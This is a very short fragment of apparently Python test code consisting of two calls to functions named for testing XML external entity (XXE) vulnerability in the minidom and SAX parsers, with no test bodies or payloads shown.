     test_xxe_minidom_vulnerable()
     test_xxe_sax_vulnerable()
